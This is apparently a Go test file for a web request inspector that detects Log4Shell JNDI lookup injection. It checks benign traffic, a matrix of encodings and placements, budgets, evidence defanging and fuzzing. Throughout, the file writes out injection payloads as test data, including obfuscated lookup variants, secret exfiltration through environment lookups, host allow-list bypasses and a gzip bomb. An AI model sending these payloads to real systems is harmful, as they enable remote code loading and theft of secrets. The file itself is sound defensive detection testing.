package engine

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"reflect"
	"regexp"
	"sort"
	"strings"
	"testing"
)

func newReq(method, target string, headers ...string) Request {
	r := Request{Method: method, Target: target}
	for i := 0; i+1 < len(headers); i += 2 {
		r.Headers = append(r.Headers, Header{Name: headers[i], Value: headers[i+1]})
	}
	return r
}

func withBody(r Request, contentType, body string) Request {
	r.Headers = append(r.Headers, Header{Name: "Content-Type", Value: contentType})
	r.Body = []byte(body)
	return r
}

func ruleSet(v Verdict) []RuleID {
	seen := map[RuleID]bool{}
	for _, d := range v.Detections {
		seen[d.Rule] = true
	}
	out := make([]RuleID, 0, len(seen))
	for r := range seen {
		out = append(out, r)
	}
	sort.Slice(out, func(i, j int) bool { return out[i] < out[j] })
	return out
}

func browserGET() Request {
	return newReq("GET", "/api/v1/items?id=42&sort=asc&q=hello%20world",
		"Host", "app.example.com",
		"User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
		"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language", "en-US,en;q=0.9",
		"Accept-Encoding", "gzip, deflate, br",
		"Cookie", "session=abc123; theme=dark; _ga=GA1.2.1234.5678",
		"Referer", "https://app.example.com/items?page=2",
		"X-Forwarded-For", "203.0.113.7, 198.51.100.2",
		"Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMSJ9.c2lnbmF0dXJl",
	)
}

func TestInspectBenignRequestsAreClean(t *testing.T) {
	tests := map[string]Request{
		"browser GET": browserGET(),
		"json POST": withBody(newReq("POST", "/api/v1/items", "Host", "app.example.com"),
			"application/json", `{"name":"widget","price":9.99,"tags":["a","b"],"note":"100% genuine"}`),
		"form POST": withBody(newReq("POST", "/login", "Host", "app.example.com"),
			"application/x-www-form-urlencoded", "user=alice&password=correct+horse&remember=on"),
		"basic auth": newReq("GET", "/", "Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte("alice:secret"))),
		"template-ish text": withBody(newReq("POST", "/paste", "Host", "app.example.com"),
			"text/plain", "echo ${HOME} and ${USER:-nobody}; const s = `${a}-${b}`; ${ not closed"),
		"unknown lookup prefix":    newReq("GET", "/?x=${foo:bar}"),
		"empty request":            {},
		"method only":              {Method: "OPTIONS"},
		"query pair without value": newReq("GET", "/?flag&other="),
		"dangling percent":         newReq("GET", "/?q=100%"),
		"bash default":             newReq("GET", "/?cmd=${VAR:-default}"),
	}
	for name, r := range tests {
		t.Run(name, func(t *testing.T) {
			v := Inspect(r, Config{})
			if v.Decision != DecisionClean || len(v.Detections) != 0 || !v.Complete() {
				t.Fatalf("got %v %+v (exhausted %v), want clean", v.Decision, v.Detections, v.Exhausted)
			}
		})
	}
}

// payloads are written in every way the engine is expected to see through.
func matrixPayloads() map[string]string {
	return map[string]string{
		"plain":            "${jndi:ldap://x.invalid/a}",
		"nested lookups":   "${${lower:j}${upper:n}${::-d}${env:NaN:-i}:ldap://x.invalid/a}",
		"percent":          "%24%7Bjndi:ldap://x.invalid/a%7D",
		"double percent":   "%2524%257Bjndi:ldap://x.invalid/a%257D",
		"html entities":    "&#36;&#123;jndi:ldap://x.invalid/a&#125;",
		"fullwidth":        "\uff04\uff5bjndi:ldap://x.invalid/a}",
		"overlong utf8":    "\xc0\xa4\xc1\xbbjndi:ldap://x.invalid/a}",
		"json escapes":     `\u0024\u007bjndi:ldap://x.invalid/a\u007d`,
		"encoded nested":   "%24%7B%24%7Blower:j%7Dndi:ldap://x.invalid/a%7D",
		"mixed case":       "${JnDi:LDAP://x.invalid/a}",
		"split by lookups": "${::-$}${::-{}jndi:ldap://x.invalid/a}",
	}
}

func gz(t *testing.T, s string) string {
	t.Helper()
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write([]byte(s)); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.String()
}

func matrixPlacements(t *testing.T) map[string]func(p string) Request {
	t.Helper()
	return map[string]func(string) Request{
		"method":        func(p string) Request { return Request{Method: p, Target: "/"} },
		"path":          func(p string) Request { return newReq("GET", "/x/"+p) },
		"query value":   func(p string) Request { return newReq("GET", "/?q="+p) },
		"query name":    func(p string) Request { return newReq("GET", "/?"+p+"=1") },
		"user agent":    func(p string) Request { return newReq("GET", "/", "User-Agent", p) },
		"x-api-version": func(p string) Request { return newReq("GET", "/", "X-Api-Version", p) },
		"header name":   func(p string) Request { return newReq("GET", "/", p, "x") },
		"cookie value":  func(p string) Request { return newReq("GET", "/", "Cookie", "session="+p+"; theme=dark") },
		"cookie name":   func(p string) Request { return newReq("GET", "/", "Cookie", p+"=1") },
		"text body":     func(p string) Request { return withBody(newReq("POST", "/"), "text/plain", "hello "+p+" bye") },
		"json body":     func(p string) Request { return withBody(newReq("POST", "/"), "application/json", `{"user":"`+p+`"}`) },
		"form body": func(p string) Request {
			return withBody(newReq("POST", "/"), "application/x-www-form-urlencoded", "a=1&b="+p)
		},
		"xml body": func(p string) Request {
			return withBody(newReq("POST", "/"), "application/xml", "<a><b>"+p+"</b></a>")
		},
		"gzip body": func(p string) Request { return withBody(newReq("POST", "/"), "text/plain", gz(t, p)) },
		"basic auth user": func(p string) Request {
			return newReq("GET", "/", "Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(p+":pw")))
		},
		"jwt payload": func(p string) Request {
			seg := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"` + p + `"}`))
			return newReq("GET", "/", "Authorization", "Bearer eyJhbGciOiJub25lIn0."+seg+".c2ln")
		},
	}
}

func TestInspectPayloadByPlacementMatrix(t *testing.T) {
	payloads := matrixPayloads()
	for pname, payload := range payloads {
		for lname, place := range matrixPlacements(t) {
			t.Run(pname+"/"+lname, func(t *testing.T) {
				v := Inspect(place(payload), Config{})
				if v.Decision != DecisionMalicious {
					t.Fatalf("Decision = %v, want malicious; detections %+v", v.Decision, v.Detections)
				}
				if !v.Has(RuleJNDI) && !v.Has(RuleJNDIEvasive) {
					t.Fatalf("no JNDI rule fired; rules %v", ruleSet(v))
				}
				if !v.Complete() {
					t.Fatalf("Exhausted = %v", v.Exhausted)
				}
			})
		}
	}
}

func TestInspectRulesAndLocations(t *testing.T) {
	tests := []struct {
		name     string
		req      Request
		decision Decision
		rules    []RuleID
		loc      string // location of the first detection, "" to skip
		scheme   string
	}{
		{"plain jndi in user agent", newReq("GET", "/", "User-Agent", "${jndi:ldap://x.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI}, "header-value:User-Agent", "ldap"},
		{"plain jndi in path", newReq("GET", "/${jndi:rmi://x.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI}, "target", "rmi"},
		{"percent-encoded is evasive", newReq("GET", "/", "X-Api-Version", "%24%7Bjndi:ldap://x.invalid/a%7D"),
			DecisionMalicious, []RuleID{RuleJNDIEvasive}, "header-value:X-Api-Version", "ldap"},
		{"nested lookups are evasive", newReq("GET", "/", "Referer", "${${lower:j}ndi:ldap://x.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDIEvasive, RuleLookupSyntax}, "header-value:Referer", "ldap"},
		{"exfiltration through the key", newReq("GET", "/", "User-Agent", "${jndi:ldap://${env:SECRET}.x.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI, RuleJNDIExfil, RuleLookupSyntax}, "", "ldap"},
		{"allow-list bypass with fragment", newReq("GET", "/", "User-Agent", "${jndi:ldap://127.0.0.1#evil.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI, RuleJNDIHostBypass}, "", "ldap"},
		{"allow-list bypass with userinfo", newReq("GET", "/", "User-Agent", "${jndi:ldap://localhost@evil.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI, RuleJNDIHostBypass}, "", "ldap"},
		{"possible jndi is suspicious", newReq("GET", "/", "User-Agent", "${${env:SOMETHING}ndi:ldap://x.invalid/a}"),
			DecisionSuspicious, []RuleID{RuleJNDIPossible, RuleLookupSyntax, RuleLookupObfuscated}, "", ""},
		{"environment lookup is suspicious", newReq("GET", "/?q=${env:HOME}"),
			DecisionSuspicious, []RuleID{RuleLookupSyntax}, "", ""},
		{"lower lookup is suspicious", newReq("GET", "/", "User-Agent", "${lower:ABC}"),
			DecisionSuspicious, []RuleID{RuleLookupSyntax}, "header-value:User-Agent", ""},
		{"date lookup is suspicious", newReq("GET", "/", "User-Agent", "${date:yyyy}"),
			DecisionSuspicious, []RuleID{RuleLookupSyntax}, "", ""},
		{"obfuscated non-jndi lookup", newReq("GET", "/", "User-Agent", "${${lower:s}ys:user.name}"),
			DecisionSuspicious, []RuleID{RuleLookupSyntax, RuleLookupObfuscated}, "", ""},
		{"deep nesting", newReq("GET", "/", "User-Agent", "${a:${a:${a:${a:x}}}}"),
			DecisionSuspicious, []RuleID{RuleLookupDepth}, "header-value:User-Agent", ""},
		{"shallow nesting is fine", newReq("GET", "/", "User-Agent", "${a:${a:${a:x}}}"),
			DecisionClean, nil, "", ""},
		{"jndi inside basic credentials", newReq("GET", "/", "Authorization",
			"Basic "+base64.StdEncoding.EncodeToString([]byte("${jndi:ldap://x.invalid/a}:pw"))),
			DecisionMalicious, []RuleID{RuleJNDIEvasive}, "header-value-decoded:Authorization", "ldap"},
		{"jndi in cookie", newReq("GET", "/", "Cookie", "session=${jndi:ldap://x.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI}, "", "ldap"},
		{"jndi in form field", withBody(newReq("POST", "/"), "application/x-www-form-urlencoded", "name=${jndi:ldap://x.invalid/a}"),
			DecisionMalicious, []RuleID{RuleJNDI}, "", "ldap"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			v := Inspect(tc.req, Config{})
			if v.Decision != tc.decision {
				t.Fatalf("Decision = %v, want %v; detections %+v", v.Decision, tc.decision, v.Detections)
			}
			if got := ruleSet(v); !reflect.DeepEqual(got, sortedRules(tc.rules)) {
				t.Errorf("rules = %v, want %v", got, sortedRules(tc.rules))
			}
			if tc.loc != "" && v.Detections[0].Location.String() != tc.loc {
				t.Errorf("first location = %q, want %q", v.Detections[0].Location, tc.loc)
			}
			if tc.scheme != "" && v.Detections[0].Scheme != tc.scheme {
				t.Errorf("scheme = %q, want %q", v.Detections[0].Scheme, tc.scheme)
			}
			for _, d := range v.Detections {
				if strings.Contains(d.Evidence, "${") {
					t.Errorf("evidence %q contains an active lookup", d.Evidence)
				}
			}
		})
	}
}

func sortedRules(in []RuleID) []RuleID {
	out := append([]RuleID{}, in...)
	sort.Slice(out, func(i, j int) bool { return out[i] < out[j] })
	if len(out) == 0 {
		return []RuleID{}
	}
	return out
}

func TestInspectKeyLookupsAreReported(t *testing.T) {
	v := Inspect(newReq("GET", "/", "User-Agent", "${jndi:ldap://${sys:java.version}.${env:USER}.x.invalid/a}"), Config{})
	for _, d := range v.Detections {
		if d.Rule == RuleJNDIExfil {
			if !reflect.DeepEqual(d.KeyLookups, []string{"sys", "env"}) {
				t.Errorf("KeyLookups = %v", d.KeyLookups)
			}
			return
		}
	}
	t.Fatalf("no exfiltration detection: %+v", v.Detections)
}

func TestInspectDisabledRules(t *testing.T) {
	r := newReq("GET", "/?q=${env:HOME}")
	if v := Inspect(r, Config{}); v.Decision != DecisionSuspicious {
		t.Fatalf("baseline Decision = %v", v.Decision)
	}
	v := Inspect(r, Config{Disabled: []RuleID{RuleLookupSyntax}})
	if v.Decision != DecisionClean || len(v.Detections) != 0 {
		t.Fatalf("with the rule disabled: %v %+v", v.Decision, v.Detections)
	}

	// Disabling a rule never hides a different rule's detection.
	bad := newReq("GET", "/?q=${jndi:ldap://x.invalid/a}")
	if v := Inspect(bad, Config{Disabled: []RuleID{RuleLookupSyntax}}); v.Decision != DecisionMalicious {
		t.Fatalf("Decision = %v, want malicious", v.Decision)
	}
}

func TestInspectBudgetRulesCannotBeDisabled(t *testing.T) {
	r := newReq("GET", "/", "User-Agent", strings.Repeat("${a:", 20)+"x"+strings.Repeat("}", 20))
	v := Inspect(r, Config{Disabled: []RuleID{RuleResolveBudget, RuleDecodeBudget, RuleRequestBudget}})
	if v.Decision != DecisionMalicious || !v.Has(RuleResolveBudget) {
		t.Fatalf("got %v %+v", v.Decision, v.Detections)
	}
}

func TestInspectBudgets(t *testing.T) {
	deepEncoded := "%24"
	for i := 1; i < 8; i++ {
		deepEncoded = strings.ReplaceAll(deepEncoded, "%", "%25")
	}
	tests := []struct {
		name string
		req  Request
		cfg  Config
		rule RuleID
		want Budget
	}{
		{"too many fields", newReq("GET", "/", "A", "1", "B", "2", "C", "3", "D", "4"),
			Config{MaxFields: 5}, RuleRequestBudget, BudgetFields},
		{"request too large", newReq("GET", "/", "User-Agent", strings.Repeat("a", 100)),
			Config{MaxRequestBytes: 50}, RuleRequestBudget, BudgetRequestBytes},
		{"too much decoded work", newReq("GET", "/", "User-Agent", strings.Repeat("a", 100)),
			Config{MaxWorkBytes: 50}, RuleRequestBudget, BudgetWork},
		{"encoding too deep", newReq("GET", "/", "X-Data", deepEncoded),
			Config{}, RuleDecodeBudget, BudgetDepth},
		{"field too large", newReq("GET", "/", "X-Data", strings.Repeat("a", 64)),
			Config{Limits: Limits{MaxInputBytes: 32}}, RuleDecodeBudget, BudgetInputSize},
		{"lookups nested too deep", newReq("GET", "/", "X-Data", strings.Repeat("${a:", 20)+"x"+strings.Repeat("}", 20)),
			Config{}, RuleResolveBudget, BudgetNesting},
		{"gzip bomb", withBody(newReq("POST", "/"), "text/plain", gz(t, strings.Repeat("\x00", 4<<20))),
			Config{}, RuleDecodeBudget, BudgetStageBytes},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			v := Inspect(tc.req, tc.cfg)
			if v.Decision != DecisionMalicious || v.Complete() {
				t.Fatalf("Decision = %v, Exhausted = %v, want malicious and incomplete", v.Decision, v.Exhausted)
			}
			if v.Exhausted != tc.want || !v.Has(tc.rule) {
				t.Fatalf("Exhausted = %v, rules %v; want %v and %v", v.Exhausted, ruleSet(v), tc.want, tc.rule)
			}
		})
	}
}

func TestInspectDeduplicatesAndIsDeterministic(t *testing.T) {
	payload := "${jndi:ldap://x.invalid/a}"
	r := newReq("GET", "/", "User-Agent", payload, "User-Agent", payload)
	v := Inspect(r, Config{})
	count := 0
	for _, d := range v.Detections {
		if d.Rule == RuleJNDI && d.Location.String() == "header-value:User-Agent" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("repeated header produced %d identical detections, want 1", count)
	}

	r = browserGET()
	r.Headers = append(r.Headers, Header{Name: "X-Evil", Value: "%24%7B%24%7Blower:j%7Dndi:ldap://x.invalid/a%7D"})
	if a, b := Inspect(r, Config{}), Inspect(r, Config{}); !reflect.DeepEqual(a, b) {
		t.Fatal("Inspect is not deterministic")
	}
}

func TestInspectDoesNotModifyTheRequest(t *testing.T) {
	r := withBody(browserGET(), "application/json", `{"a":"%24%7Bjndi:ldap://x.invalid/a%7D"}`)
	before := Request{Method: r.Method, Target: r.Target, Headers: append([]Header(nil), r.Headers...), Body: append([]byte(nil), r.Body...)}
	_ = Inspect(r, Config{})
	if !reflect.DeepEqual(before, r) {
		t.Fatal("Inspect modified its input")
	}
}

func TestRuleCatalogue(t *testing.T) {
	all := []RuleID{
		RuleJNDI, RuleJNDIEvasive, RuleJNDIPossible, RuleJNDIExfil, RuleJNDIHostBypass,
		RuleLookupDepth, RuleLookupSyntax, RuleLookupObfuscated,
		RuleDecodeBudget, RuleResolveBudget, RuleRequestBudget,
	}
	idFormat := regexp.MustCompile(`^LSH-[0-9]{4}$`)
	cveFormat := regexp.MustCompile(`^CVE-[0-9]{4}-[0-9]{4,}$`)

	rules := Rules()
	if len(rules) != len(all) {
		t.Fatalf("catalogue has %d rules, expected %d constants", len(rules), len(all))
	}
	seenID, seenName := map[RuleID]bool{}, map[string]bool{}
	for i, r := range rules {
		if r.ID != all[i] {
			t.Errorf("rule %d is %s, want %s (catalogue order must match)", i, r.ID, all[i])
		}
		if !idFormat.MatchString(string(r.ID)) {
			t.Errorf("%s: bad ID format", r.ID)
		}
		if seenID[r.ID] || seenName[r.Name] {
			t.Errorf("%s: duplicate ID or name", r.ID)
		}
		seenID[r.ID], seenName[r.Name] = true, true
		if r.Name == "" || r.Description == "" {
			t.Errorf("%s: missing name or description", r.ID)
		}
		if r.Severity != SeveritySuspicious && r.Severity != SeverityMalicious {
			t.Errorf("%s: bad severity", r.ID)
		}
		for _, c := range r.CVEs {
			if !cveFormat.MatchString(c) {
				t.Errorf("%s: bad CVE %q", r.ID, c)
			}
		}
		if strings.HasPrefix(string(r.ID), "LSH-3") && (!r.Mandatory || r.Severity != SeverityMalicious) {
			t.Errorf("%s: budget rules must be mandatory and malicious", r.ID)
		}
	}

	// Rules returns copies.
	rules[0].CVEs[0] = "tampered"
	if Rules()[0].CVEs[0] == "tampered" {
		t.Error("Rules exposes the internal catalogue")
	}

	if _, ok := ruleInfo("LSH-9999"); ok {
		t.Error("ruleInfo found a rule that does not exist")
	}
	in := &inspector{cfg: Config{}.withDefaults(), seen: map[string]struct{}{}}
	in.add(Detection{Rule: "LSH-9999"})
	if len(in.v.Detections) != 0 {
		t.Error("a detection for an unknown rule must be dropped")
	}
}

func TestDecisionAndSeverityStrings(t *testing.T) {
	d := map[Decision]string{DecisionClean: "clean", DecisionSuspicious: "suspicious", DecisionMalicious: "malicious", Decision(9): "unknown"}
	for k, want := range d {
		if got := k.String(); got != want {
			t.Errorf("Decision(%d) = %q, want %q", int(k), got, want)
		}
	}
	s := map[Severity]string{SeveritySuspicious: "suspicious", SeverityMalicious: "malicious", Severity(9): "unknown"}
	for k, want := range s {
		if got := k.String(); got != want {
			t.Errorf("Severity(%d) = %q, want %q", int(k), got, want)
		}
	}
}

func TestDefang(t *testing.T) {
	tests := []struct {
		in   string
		max  int
		want string
	}{
		{"", 0, ""},
		{"plain text", 0, "plain text"},
		{"${jndi:x}", 0, "$%7Bjndi:x}"},
		{"$${jndi:x}", 0, "$$%7Bjndi:x}"},
		{"{not a lookup}", 0, "{not a lookup}"},
		{"100%", 0, "100%25"},
		{"a\r\nb", 0, "a%0D%0Ab"},
		{"caf\xc3\xa9", 0, "caf%C3%A9"},
		{"\x00\x7f", 0, "%00%7F"},
		{"abcdefghij", 5, "abcde..."},
		{"abcde", 5, "abcde"},
	}
	for _, tc := range tests {
		if got := Defang(tc.in, tc.max); got != tc.want {
			t.Errorf("Defang(%q, %d) = %q, want %q", tc.in, tc.max, got, tc.want)
		}
	}
	for _, in := range []string{"${", "$${", "$$$${{", "a${b}${c}", "${${${", "$\x00{", "$%{"} {
		out := Defang(in, 0)
		if strings.Contains(out, "${") {
			t.Errorf("Defang(%q) = %q still contains an active lookup", in, out)
		}
	}
}

func TestHostBypass(t *testing.T) {
	tests := map[string]bool{
		"ldap://127.0.0.1#evil.invalid/a":   true,
		"ldap://localhost@evil.invalid/a":   true,
		"ldap://127.0.0.1#evil.invalid":     true,
		"ldap://x.invalid/a#fragment":       false,
		"ldap://x.invalid?x=#":              false,
		"ldap://x.invalid/user@example.com": false,
		"ldap://x.invalid/a":                false,
		"no scheme here#":                   false,
		"":                                  false,
	}
	for key, want := range tests {
		if got := hostBypass(key); got != want {
			t.Errorf("hostBypass(%q) = %v, want %v", key, got, want)
		}
	}
}

func TestExtractFields(t *testing.T) {
	r := withBody(newReq("POST", "/p?a=1&b&=v&&c=x=y",
		"Cookie", " s=1 ; t = 2;;u",
		"Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte("bob:pw")),
	), "application/x-www-form-urlencoded; charset=UTF-8", "f=1&g")
	fields, b := extractFields(r, Config{}.withDefaults())
	if b != BudgetNone {
		t.Fatalf("budget %v", b)
	}
	got := make([]string, len(fields))
	for i, f := range fields {
		got[i] = f.loc.String() + "=" + f.text
	}
	want := []string{
		"method=POST", "target=/p?a=1&b&=v&&c=x=y",
		"query-name=a", "query-value:a=1", "query-name=b", "query-value:b=",
		"query-name=", "query-value=v", "query-name=c", "query-value:c=x=y",
		"header-name=Cookie", "header-value:Cookie= s=1 ; t = 2;;u",
		"cookie-name=s", "cookie-value:s=1", "cookie-name=t", "cookie-value:t=2", "cookie-name=u", "cookie-value:u=",
		"header-name=Authorization", "header-value:Authorization=Basic Ym9iOnB3",
		"header-value-decoded:Authorization=bob:pw",
		"header-name=Content-Type", "header-value:Content-Type=application/x-www-form-urlencoded; charset=UTF-8",
		"body=f=1&g", "form-name=f", "form-value:f=1", "form-name=g", "form-value:g=",
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("fields differ:\n got %q\nwant %q", got, want)
	}
}

func TestDecodeCredentials(t *testing.T) {
	b64 := base64.StdEncoding.EncodeToString
	raw := base64.RawURLEncoding.EncodeToString
	tests := []struct {
		in   string
		want []string
	}{
		{"Basic " + b64([]byte("u:p")), []string{"u:p"}},
		{"basic   " + b64([]byte("u:p")), []string{"u:p"}},
		{"Basic !!!notbase64!!!", nil},
		{"Basic ", nil},
		{"Basic", nil},
		{"Digest username=\"x\"", nil},
		{"Bearer " + raw([]byte("h")) + "." + raw([]byte("p")) + ".sig", []string{"h", "p"}},
		{"Basic " + b64([]byte{0xff, 0xfe, 0x01}), nil},
		{"Bearer opaque-token-with-dashes", nil},
		{"Bearer " + raw([]byte("a")) + "." + raw([]byte("b")) + "." + raw([]byte("c")) + "." + raw([]byte("d")), []string{"a", "b"}},
		{"", nil},
	}
	for _, tc := range tests {
		if got := decodeCredentials(tc.in); !reflect.DeepEqual(got, tc.want) {
			t.Errorf("decodeCredentials(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestLocationAndMediaType(t *testing.T) {
	if got := (Location{Part: "body"}).String(); got != "body" {
		t.Errorf("got %q", got)
	}
	if got := (Location{Part: "cookie-value", Name: "s"}).String(); got != "cookie-value:s" {
		t.Errorf("got %q", got)
	}
	if got := mediaType([]Header{{"content-type", " Application/JSON ; charset=utf-8"}}); got != "application/json" {
		t.Errorf("mediaType = %q", got)
	}
	if got := mediaType(nil); got != "" {
		t.Errorf("mediaType(nil) = %q", got)
	}
	if got, ok := decodeBase64(""); got != "" || ok {
		t.Errorf("decodeBase64(\"\") = %q, %v", got, ok)
	}
}

func FuzzInspect(f *testing.F) {
	seeds := [][5]string{
		{"GET", "/", "User-Agent", "Mozilla/5.0", ""},
		{"GET", "/?q=${jndi:ldap://x.invalid/a}", "X", "y", ""},
		{"POST", "/", "Content-Type", "application/x-www-form-urlencoded", "a=%24%7Bjndi:x%7D"},
		{"GET", "/", "Authorization", "Basic JHtqbmRpOmxkYXA6Ly94LmludmFsaWQvYX0=", ""},
		{"GET", "/", "Cookie", "a=${${lower:j}ndi:x}; b", ""},
		{"", "", "", "", ""},
	}
	for _, s := range seeds {
		f.Add(s[0], s[1], s[2], s[3], s[4])
	}

	cfg := Config{
		Limits:          Limits{MaxInputBytes: 4096, MaxDepth: 4, MaxStages: 16, MaxStageBytes: 8192, MaxTotalBytes: 32768, MaxNesting: 8, MaxLookups: 64, MaxValueBytes: 2048},
		MaxFields:       64,
		MaxRequestBytes: 16384,
		MaxWorkBytes:    1 << 20,
	}

	f.Fuzz(func(t *testing.T, method, target, hname, hvalue, body string) {
		r := Request{Method: method, Target: target, Headers: []Header{{hname, hvalue}}, Body: []byte(body)}
		v := Inspect(r, cfg)

		var malicious, suspicious bool
		for _, d := range v.Detections {
			info, ok := ruleInfo(d.Rule)
			if !ok || info.Severity != d.Severity {
				t.Fatalf("detection with unknown rule or wrong severity: %+v", d)
			}
			for _, text := range append([]string{d.Evidence, d.Scheme}, d.KeyLookups...) {
				if strings.Contains(text, "${") {
					t.Fatalf("%s carries an active lookup: %q", d.Rule, text)
				}
			}
			if len(d.Evidence) > maxEvidence+16 {
				t.Fatalf("evidence of %d bytes exceeds the cap", len(d.Evidence))
			}
			malicious = malicious || d.Severity == SeverityMalicious
			suspicious = suspicious || d.Severity == SeveritySuspicious
		}
		want := DecisionClean
		if malicious {
			want = DecisionMalicious
		} else if suspicious {
			want = DecisionSuspicious
		}
		if v.Decision != want {
			t.Fatalf("Decision = %v but detections imply %v", v.Decision, want)
		}
		if v.Exhausted != BudgetNone && v.Decision != DecisionMalicious {
			t.Fatalf("exhausted budget %v must be malicious", v.Exhausted)
		}
		if !reflect.DeepEqual(v, Inspect(r, cfg)) {
			t.Fatal("non-deterministic verdict")
		}
	})
}
